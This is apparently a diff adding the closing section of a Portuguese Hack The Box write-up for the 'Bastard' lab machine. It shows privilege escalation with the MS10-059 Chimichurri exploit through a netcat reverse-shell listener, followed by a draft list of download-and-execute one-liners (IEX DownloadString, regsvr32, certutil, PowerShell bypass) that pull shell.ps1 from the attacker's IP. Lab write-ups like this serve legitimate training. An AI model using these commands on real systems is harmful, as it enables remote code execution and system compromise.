@@ -209,3 +209,43 @@ root@kali:/opt/Windows-PrivEsc-Tools/Windows-Exploit-Suggester# python windows-e
 [*] done
 ```
 
+Mas uma breve pesquisa relacionada as  vulns encontradas, rapidamente encontro um exploit interessante e promissor.
+
+***reference*** https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri
+
+Deixe a porta de sua escolha escutando, eu usei a 1337
+
+`rlwrap nc -nlvp 1337`
+
+Em seguida, execute o Chimichurri
+
+`PS C:\inetpub\drupal-7.54> .\Chimichurri.exe 10.10.14.36 1337`
+
+## GET SYSTEM
+
+![11.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/11.jpg)
+
+## Rascunho
+
+```
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36/shell.ps1')
+
+
+
+regsvr32 /u /n /s /i:http://10.10.14.36/shell.ps1 C:\windows\temp\shell.ps1
+
+
+powershell -exec bypass -f \\webdavserver\folder\payload.ps1
+
+
+
+regsvr32 /u /n /s /i:http://10.10.14.36/shell.ps1 shell.ps1
+
+
+
+certutil -urlcache -split -f http://10.10.14.36/shell.ps1 shell.ps1
+
+python /opt/windowsPrivEsc/wesng/wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only >> exploits_sugest_wes.txt
+
+python windows-exploit-suggester.py --database 2020-06-23-mssb.xls --systeminfo /root/HTB-Windows/bastard/systeminfo.txt
+```
